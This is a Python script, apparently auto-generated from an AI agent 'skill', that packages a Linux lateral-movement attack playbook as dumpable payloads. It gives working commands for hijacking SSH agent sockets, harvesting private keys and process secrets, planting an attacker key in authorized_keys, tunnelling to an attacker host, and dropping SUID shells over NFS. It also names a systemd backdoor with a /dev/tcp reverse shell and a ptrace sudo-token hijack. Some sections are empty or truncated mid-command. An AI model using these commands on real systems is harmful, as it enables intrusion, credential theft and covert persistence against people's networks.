#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/linux-lateral-movement

Skill: SKILL: Linux Lateral Movement — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-linux-lateral-movement.py --help
      python hack-skills-linux-lateral-movement.py --list
      python hack-skills-linux-lateral-movement.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/linux-lateral-movement'
TITLE = 'SKILL: Linux Lateral Movement — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: linux-lateral-movement", "description: >-", "Linux lateral movement playbook. Use after gaining initial access to pivot across Linux hosts via SSH hijacking, credential harvesting, internal pivoting, D-Bus exploitation, sudo token reuse, and shared filesystem abuse."],
    'skill-linux-lateral-movement-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) if you need root on the current host before pivoting", "- [linux-security-bypass](../linux-security-bypass/SKILL.md) when restricted shells or security modules block lateral movement tools", "- [container-escape-techniques](../container-escape-techniques/SKILL.md) when the target network includes containerized hosts", "- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) when pivoting into a Kubernetes cluster", "- [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md) for exploiting discovered internal services (Redis, MongoDB, etc.)"],
    '1-ssh-agent-hijacking': [],
    '1-1-find-ssh-agent-sockets': ["```bash"],
    'as-root-or-user-with-access-to-other-users-processes': ["find /tmp -path \"*/ssh-*\" -name \"agent.*\" 2>/dev/null"],
    'or-via-proc': ["grep -r SSH_AUTH_SOCK /proc/*/environ 2>/dev/null | tr '\\0' '\\n'"],
    'typical-path-tmp-ssh-xxxxxx-agent-pid': [],
    '1-2-hijack-agent-forwarding': ["```bash"],
    'set-the-found-socket-as-our-auth-agent': ["export SSH_AUTH_SOCK=/tmp/ssh-AbCdEf/agent.12345"],
    'list-available-keys-in-the-agent': ["ssh-add -l"],
    'if-keys-appear-we-can-use-them': [],
    'ssh-to-any-host-this-agent-can-authenticate-to': ["ssh -o StrictHostKeyChecking=no user@internal-host"],
    'the-agent-owner-won-t-notice-we-re-using-their-forwarded-agent': [],
    '1-3-persistent-agent-monitoring': ["```bash"],
    'monitor-for-new-ssh-agent-sockets-wait-for-admin-to-ssh-in': ["inotifywait -m /tmp -e create 2>/dev/null | grep ssh-"],
    'or-poll': ["while true; do", "find /tmp -path \"*/ssh-*\" -name \"agent.*\" -newer /tmp/.marker 2>/dev/null", "touch /tmp/.marker", "sleep 5"],
    '2-ssh-key-harvesting': [],
    '2-1-private-key-locations': ["```bash", "find / -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \"*.pem\" -o -name \"*.key\" 2>/dev/null"],
    'also-etc-ssh-ssh-host-key-mitm-home-ssh-id': [],
    'find-keys-without-passphrase': ["for key in $(find / -name \"id_*\" ! -name \"*.pub\" 2>/dev/null); do", "ssh-keygen -y -P \"\" -f \"$key\" > /dev/null 2>&1 && echo \"NO PASSPHRASE: $key\""],
    '2-2-known-hosts-parsing': ["```bash"],
    'hashed-known-hosts-common-default': ["cat ~/.ssh/known_hosts"],
    'may-be-hashed-use-ssh-keygen-to-check-against-known-ips': ["ssh-keygen -F 10.0.0.1 -f ~/.ssh/known_hosts"],
    'unhashed-known-hosts-direct-ip-hostname-list': ["awk '{print $1}' ~/.ssh/known_hosts | sort -u"],
    'extract-all-hostnames-ips-from-all-users-known-hosts': ["cat /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null \\"],
    '2-3-authorized-keys-injection': ["```bash"],
    'generate-attacker-keypair-on-attacker-box': ["ssh-keygen -t ed25519 -f /tmp/pivot_key -N \"\""],
    'inject-public-key-on-compromised-host': ["echo \"ssh-ed25519 AAAA...attacker_pubkey...\" >> /root/.ssh/authorized_keys", "echo \"ssh-ed25519 AAAA...attacker_pubkey...\" >> /home/admin/.ssh/authorized_keys"],
    'ssh-back-in-with-our-key': ["ssh -i /tmp/pivot_key root@target"],
    '3-credential-harvesting-locations': [],
    '3-1-system-credentials': [],
    '3-2-environment-config-files': ["```bash"],
    'current-process-secrets': ["env | grep -iE \"pass|key|secret|token|api|cred|auth\""],
    'all-process-environments-root': ["for pid in /proc/[0-9]*; do", "cat $pid/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE \"pass|key|secret|token\""],
    'application-configs-common-credential-locations': ["find /var/www /opt /srv -name \"wp-config.php\" -o -name \"settings.py\" \\", "-o -name \"*.env\" -o -name \"database.yml\" -o -name \"docker-compose.yml\" 2>/dev/null"],
    'keyrings-secret-stores': ["find / -name \"*.keyring\" -o -name \".vault-token\" -o -path \"*/.password-store/*.gpg\" 2>/dev/null"],
    '4-d-bus-exploitation': [],
    '4-1-enumerate-d-bus-services': ["```bash"],
    'list-system-bus-services': ["dbus-send --system --dest=org.freedesktop.DBus \\", "--type=method_call --print-reply \\", "/org/freedesktop/DBus org.freedesktop.DBus.ListNames"],
    'list-session-bus-services': ["dbus-send --session --dest=org.freedesktop.DBus \\", "--type=method_call --print-reply \\", "/org/freedesktop/DBus org.freedesktop.DBus.ListNames"],
    'introspect-a-service-find-available-methods': ["dbus-send --system --dest=org.freedesktop.systemd1 \\", "--type=method_call --print-reply \\", "/org/freedesktop/systemd1 org.freedesktop.DBus.Introspectable.Introspect"],
    '4-2-abuse-systemd-policykit-via-d-bus': ["```bash"],
    'start-a-service-via-d-bus-if-policy-allows': ["dbus-send --system --dest=org.freedesktop.systemd1 \\", "--type=method_call --print-reply /org/freedesktop/systemd1 \\", "org.freedesktop.systemd1.Manager.StartUnit \\", "string:\"malicious.service\" string:\"replace\""],
    'polkit-actions-available-without-auth': ["pkaction --verbose 2>/dev/null | grep -B5 \"implicit active: yes\""],
    '5-internal-network-pivoting': [],
    '5-1-ssh-tunneling': ["```bash"],
    'local-port-forward-access-internal-host-3306-via-localhost-3306': ["ssh -L 3306:INTERNAL_HOST:3306 pivot@compromised-host"],
    'remote-port-forward-expose-attacker-service-to-internal-network': ["ssh -R 8080:ATTACKER:8080 pivot@compromised-host"],
    'dynamic-socks-proxy-route-all-traffic-through-pivot': ["ssh -D 1080 pivot@compromised-host"],
    'then-proxychains-nmap-st-internal-range': [],
    'ssh-over-ssh-multi-hop': ["ssh -J user1@hop1,user2@hop2 target@final-host"],
    '5-2-without-ssh-alternative-tunnels': ["```bash"],
    'socat-port-forward': ["socat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80 &"],
    'ncat-relay': ["ncat -l -p 8080 --sh-exec \"ncat INTERNAL_HOST 80\""],
    'dev-tcp-bash-built-in-no-tools-needed': ["exec 3<>/dev/tcp/INTERNAL_HOST/80", "echo -e \"GET / HTTP/1.0\\r\\nHost: INTERNAL_HOST\\r\\n\\r\\n\" >&3", "cat <&3"],
    'chisel-socks-proxy-over-http': [],
    'on-attacker-chisel-server-p-8080-reverse': [],
    'on-target-chisel-client-attacker-8080-r-socks': [],
    '5-3-network-discovery-from-compromised-host': ["```bash", "ss -tlnp && ss -tnp                  # Listening & established connections", "arp -a && ip neigh                    # Known adjacent hosts", "cat /etc/resolv.conf                  # DNS servers", "dig axfr internal.domain @dns 2>/dev/null   # Zone transfer"],
    'subnet-sweep-bash-only-no-tools': ["for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo \"ALIVE: 10.0.0.$i\" & done; wait"],
    'port-scan-via-dev-tcp': ["for port in 22 80 443 3306 5432 6379 8080; do", "(echo >/dev/tcp/10.0.0.1/$port) 2>/dev/null && echo \"OPEN: $port\""],
    '6-shared-filesystem-exploitation': [],
    '6-1-nfs-mounts': ["```bash"],
    'discover-nfs-shares': ["showmount -e FILESERVER_IP 2>/dev/null"],
    'check-for-no-root-squash-root-maps-to-root': ["mount -t nfs FILESERVER_IP:/share /mnt/nfs"],
    'if-no-root-squash-create-suid-binaries-visible-to-other-hosts': [],
    'all-hosts-mounting-the-same-share-suid-binary-root-on-all-hosts': ["cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash"],
    '6-2-smb-cifs-shares': ["```bash"],
    'enumerate-shares': ["smbclient -L //FILESERVER_IP/ -N 2>/dev/null      # Null session", "smbclient -L //FILESERVER_IP/ -U 'user%password'"],
    'mount-and-search-for-credentials': ["mount -t cifs //FILESERVER_IP/share /mnt/smb -o username=user,password=pass", "find /mnt/smb -name \"*.conf\" -o -name \"*.cfg\" -o -name \"*.kdbx\" \\", "-o -name \"*.xlsx\" -o -name \"*.docx\" 2>/dev/null"],
    '7-sudo-token-reuse-ptrace-based': ["```bash"],
    'if-another-user-has-an-active-sudo-session-timestamp-not-expired': [],
    'and-we-can-ptrace-their-process-same-uid-or-root': [],
    'check-sudo-timestamp-files': ["ls -la /var/run/sudo/ts/ 2>/dev/null", "ls -la /var/db/sudo/ 2>/dev/null"],
    'files-here-mean-active-sudo-tokens': [],
    'ptrace-based-hijack': [],
    'attach-to-the-user-s-shell-process': [],
    'inject-sudo-bin-bash': [],
    'the-injected-sudo-inherits-the-valid-timestamp-no-password-needed': [],
    'automated-tool-sudo-inject': [],
    'https-github-com-nongiach-sudo-inject': [],
    'injects-into-processes-with-valid-sudo-tokens': [],
    '8-systemd-service-manipulation': ["```bash"],
    'find-writable-unit-files': ["find /etc/systemd /usr/lib/systemd -writable -name \"*.service\" 2>/dev/null"],
    'inject-into-existing-service-add-execstartpre': [],
    'or-create-new-etc-systemd-system-backdoor-service': [],
    'service-type-oneshot-execstart-bin-bash-c-bash-i-dev-tcp-attacker-4444-0-1': ["systemctl daemon-reload && systemctl enable --now backdoor.service"],
    '9-lateral-movement-decision-tree': ["Compromised host \u2014 where to move next?", "\u251c\u2500\u2500 SSH credentials available?", "\u2502   \u251c\u2500\u2500 Private keys found? \u2192 try on all known_hosts targets (\u00a72)", "\u2502   \u251c\u2500\u2500 SSH agent running? \u2192 hijack socket (\u00a71)", "\u2502   \u251c\u2500\u2500 Passwords in history/configs? \u2192 spray across hosts (\u00a73)", "\u2502   \u2514\u2500\u2500 authorized_keys writable on other hosts? \u2192 inject key (\u00a72.3)", "\u251c\u2500\u2500 Network services discovered?", "\u2502   \u251c\u2500\u2500 Internal web apps? \u2192 tunnel + attack (\u00a75.1)", "\u2502   \u251c\u2500\u2500 Databases (3306/5432/6379)? \u2192 check harvested creds (\u00a73)", "\u2502   \u251c\u2500\u2500 SMB/NFS shares? \u2192 mount + search for creds/SUID (\u00a76)", "\u2502   \u2514\u2500\u2500 Kubernetes API (6443)? \u2192 load kubernetes-pentesting skill", "\u251c\u2500\u2500 Can reach other hosts?", "\u2502   \u251c\u2500\u2500 Direct SSH? \u2192 use keys/passwords", "\u2502   \u251c\u2500\u2500 Firewalled? \u2192 SSH tunnel or chisel (\u00a75)", "\u2502   \u2514\u2500\u2500 No tools? \u2192 /dev/tcp + bash (\u00a75.2)", "\u251c\u2500\u2500 Root on current host?", "\u2502   \u251c\u2500\u2500 Read /etc/shadow \u2192 crack hashes \u2192 password reuse (\u00a73)", "\u2502   \u251c\u2500\u2500 Dump /proc/*/environ \u2192 find service credentials (\u00a73.2)", "\u2502   \u251c\u2500\u2500 Hijack sudo tokens \u2192 piggyback admin sessions (\u00a77)", "\u2502   \u2514\u2500\u2500 Modify systemd services \u2192 backdoor (\u00a78)", "\u251c\u2500\u2500 D-Bus services available?", "\u2502   \u251c\u2500\u2500 Privileged services exposed? \u2192 method call abuse (\u00a74)", "\u2502   \u2514\u2500\u2500 polkit actions without auth? \u2192 privilege actions (\u00a74.3)", "\u2514\u2500\u2500 No obvious path?", "\u251c\u2500\u2500 ARP scan + port sweep internal network (\u00a75.3)", "\u251c\u2500\u2500 Passive credential sniffing (if cap_net_raw)", "\u251c\u2500\u2500 Wait for admin SSH \u2192 agent hijack (\u00a71.3)", "\u2514\u2500\u2500 Check for cloud metadata (169.254.169.254)"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()